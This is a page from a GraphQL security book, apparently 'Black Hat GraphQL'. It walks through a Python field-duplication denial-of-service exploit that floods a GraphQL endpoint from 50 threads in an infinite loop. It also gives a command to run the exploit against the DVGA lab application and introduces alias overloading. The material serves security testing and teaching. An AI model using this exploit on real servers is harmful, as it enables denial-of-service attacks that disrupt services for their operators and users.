- pgno: 141
  md: "a snippet of such an exploit. It sends a continuous stream of queries to a\
    \ remote server in order to exhaust its resources.\n\n```\nTHREADS = 50\n\n① payload\
    \ = 'content \\n title \\n' * 1000\n② query = {'query':'query { \\n ' + payload\
    \ + '}'} \n\n③ def DoS():\n    try:\n        r = requests.post(GRAPHQL_URL, json=query)\n\
    \        print('Time took: {} seconds '.format(r.elapsed.total_seconds()))\n \
    \       print('Response:', r.json())\n    except Exception as e:\n        print('Error',\
    \ e.message)\n\n④ while True:\n    print('Running...')\n    time.sleep(2)\n  \
    \  for _ in range(THREADS):\n        t = threading.Thread(target=DoS, args=())\n\
    \        t.start()\n```\n\nListing 5-6: A field duplication exploit\n\nThis code\
    \ creates a dynamic payload variable ① with two duplicated fields: content and\
    \ title. Each is repeated 1,000 times. At ② it concatenates the payload with the\
    \ query JSON variable. It then defines a function named DoS that is responsible\
    \ for sending the HTTP POST request containing our malicious GraphQL query ③.\
    \ We run an infinite while loop that executes the DoS function using 50 threads\
    \ every two seconds ④. The full exploit code can be found on GitHub at https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch05/exploit_threaded_field_dup.py\n\
    \nYou can download this exploit and run it against DVGA with the following command.\
    \ Keep in mind that performance could degrade on your machine while it is running:\n\
    \n```\n# python3 exploit_threaded_field_dup.py http://localhost:5013/graphql\n\
    ```\n\nSince the exploit uses an infinite loop, it won’t stop its operations on\
    \ its own; you can halt it by pressing CTRL-C to send the SIGINT signal.\n\n#\
    \ Alias Overloading\n\nIn Chapter 3, you learned how to use aliases to rename\
    \ duplicate fields so that the GraphQL server treats them as two different queries.\
    \ The ability to run multiple queries in a single HTTP request is quite powerful.\
    \ Security analysts could easily overlook these single requests when hunting for\
    \ suspicious traffic (as could WAFs). After all, they might think, what harm can\
    \ a single HTTP request possibly cause?"
